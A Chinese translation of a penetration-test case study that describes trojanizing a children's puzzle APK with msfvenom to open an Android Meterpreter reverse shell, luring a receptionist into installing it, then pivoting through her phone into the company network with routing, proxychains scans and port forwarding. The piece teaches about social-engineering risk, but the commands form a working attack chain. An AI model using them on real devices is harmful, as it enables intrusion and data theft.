# 【技术分享】公司智能手机安全（一）——从APK到Golden Ticket：初步探测

## 译文声明
本文是翻译文章，原文来自infosecinstitute.com。译文仅供参考，具体内容及含义以原文为准。
- 翻译者：[村雨其实没有雨](http://bobao.360.cn/member/contribute?uid=2671379114)
- 预估稿费：200 RMB
- 投稿方式：发送邮件至linwei#360.cn，或通过网页版在线投稿

## 摘要
本文探讨了企业网络中使用个人智能手机的潜在风险，并通过实际案例展示了如何通过欺骗员工安装恶意应用程序，进而绕过网络安全措施，获取敏感信息。此外，文章还介绍了在不被发现的情况下绕过所有防护机制的方法。

## 背景
“超级公司”聘请了我们的渗透测试工程师对其员工进行社会工程学评估，旨在找出所有可能窃取机密资料的方法。在内部见面会期间，我们请求访问访客WiFi。尽管该网络受到专属保护且凭证有效期仅为一天，但连接后，我们使用Fing扫描工具发现了一些异常情况：几台Android设备出现在访客WiFi上，这显然超过了公司访客的数量。我们认为，部分员工也可能使用访客WiFi来节省数据流量。事实上，接待员在提供登录凭证时正在使用WhatsApp聊天。

### 场景描述
接待员桌上摆放着两部手机、一张全家福照片。经过简短交谈，我了解到她有一个四岁的女儿，非常活泼好动，但只要有装有游戏的智能手机就能让她安静下来。

## 攻击描述
### 初始尝试
我们首先尝试了一次小型钓鱼活动，但未能成功。随后得知，该公司员工在此之前已接受过相关培训，对附件和下载行为具有高度警惕性。

### 针对接待员
于是，我们决定将注意力集中在接待员身上，目标是让她为孩子下载一个Android应用。我们选择了拼图游戏作为诱饵，因为这对孩子们来说非常有趣。找到接待员的个人邮箱地址并不难，我们准备了一封包含下载链接和二维码的电子邮件，只需扫描即可安装应用。

### 创建恶意应用
创建恶意安卓应用的过程相对简单。我们下载了一个普通的拼图游戏应用，并使用msfvenom注入了一个Meterpreter shell：
```bash
msfvenom -x puzzle.apk -p android/meterpreter/reverse_tcp LHOST=<攻击者IP> LPORT=443 -o /var/www/html/puzzle.apk
```
选择443端口是因为它通常被防火墙允许。我们相信这款应用会引起接待员的兴趣，并忽略安装过程中的警告。

### 监听器设置
在我们的主机上，我们也开启了监听程序：
```bash
msf> use exploit/multi/handler
msf exploit(handler) > set payload android/meterpreter/reverse_tcp
payload => android/meterpreter/reverse_tcp
msf exploit(handler) > set lhost <攻击者IP>
lhost => <攻击者IP>
msf exploit(handler) > set lport 443
lport => 443
msf exploit(handler) > exploit -j -z
[*] Started reverse TCP handler on :443
```

### 利用公司附近的WiFi
为了利用员工可能会使用访客WiFi的情况，我们在公司附近放置了一个天线。

## 利用Meterpreter
大约早上8:00，我在msfconsole上收到了消息：
```bash
[*] Meterpreter session 1 opened (:443 -> X.X.X.X:51990) at …
```
这意味着她安装并运行了恶意应用，我们获得了第一个Meterpreter会话。通过检查IP地址，我们发现她是从蜂窝网络连接的，可能在去办公室的路上。

几分钟后，我们又收到了另一个会话：
```bash
[*] Meterpreter session 2 opened (:443 -> K.K.K.K:61545) at …
```
这次IP地址显示她已经连接到了公司的WiFi网络。我们开始进行初步探查，除了几台智能手机外，我们只在一个不同的子网下找到了一台DNS服务器。

### 网络配置
我们获取了以下网络配置信息：
```bash
meterpreter> ipconfig
Interface 9
===========
Name : wlan0 – wlan0
Hardware MAC : 20:6e:9c:75:94:ba
IPv4 Address : 10.118.1.13
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::226e:9cff:fe75:94ba
IPv6 Netmask : ::
...
meterpreter > shell
Process 1 created. Channel 1 created.
getprop net.dns1
192.168.178.196
```
访客WiFi网络在10.118.1.0/24上，而DNS服务器位于另一个子网192.168.178.0/24。为了访问该子网，我们配置了路由：
```bash
exploit(handler) > route add 192.168.178.0 255.255.255.0 1
```

### 网络扫描
由于Nmap扫描无法执行，我们使用proxychains进行了一次快速的ping扫描：
```bash
msf auxiliary(socks4a) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > show options
Module options (auxiliary/server/socks4a):
Name Current Setting Required Description
--- ————— ——– ———–
SRVHOST 0.0.0.0 yes The address to listen on
SRVPORT 1080 yes The port to listen on.

# Attacker 
proxychains nmap -sn 192.168.178.0/24  DNS network
Nmap scan report for 192.168.178.195
Host is up (0.15s latency).
Nmap scan report for 192.168.178.196
Host is up (0.22s latency).
```
所有主机都对ping扫描进行了响应。接着，我们进行了一次快速TCP扫描：
```bash
msf exploit(handler) > use auxiliary/scanner/portscan/tcp
msf auxiliary(tcp) > set RHOSTS 192.168.178.195,196
msf auxiliary(tcp) > set RPORTS 1-1024
msf auxiliary(tcp) > run
[*] 192.168.178.195: – 192.168.178.195:80 – TCP OPEN
[*] 192.168.178.195: – 192.168.178.195:8080 – TCP OPEN
[*] 192.168.178.196: – 192.168.178.196:53 – TCP OPEN
```

### 内网服务器探测
主机192.168.178.195开放了80和8080端口，我们在本地转发了这些端口，以便能够分析网络流量：
```bash
meterpreter> portfwd add -L 127.0.0.1 -l 8001 -r 192.168.178.195 -p 80
```

通过以上步骤，我们成功地进入了公司内网，并为进一步的攻击奠定了基础。